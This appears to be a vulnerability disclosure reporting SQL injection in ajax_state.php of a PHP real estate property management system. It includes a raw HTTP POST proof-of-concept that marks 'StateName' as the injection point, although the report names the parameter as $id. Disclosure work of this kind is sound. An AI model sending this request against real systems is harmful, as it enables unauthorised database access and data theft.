# Real Estate Property Management System has sql injection vulnerability in ajax_state.php

## supplier 
https://code-projects.org/real-estate-property-management-system-php-source-code/
## Vulnerability file
$id parameter in ajax_state.php

## describe

An unrestricted SQL injection attack exists in an Real Estate Property Management System. The parameters that can be controlled are as follows: $id. This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the value of   id parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/89f710a7-515b-4768-ac51-ced15b68b570)

## POC

```
POST /ajax_state.php HTTP/1.1
Host: property
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://property
Connection: close
Referer: http://property/ajax_city.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i

StateName=2*
```

**Result**

get databases 

![Image](https://github.com/user-attachments/assets/8dfe7598-3065-44c6-b08d-2e7dad0f8198)
![Image](https://github.com/user-attachments/assets/9fac5d1e-8436-4270-8458-5ec9a895129e)
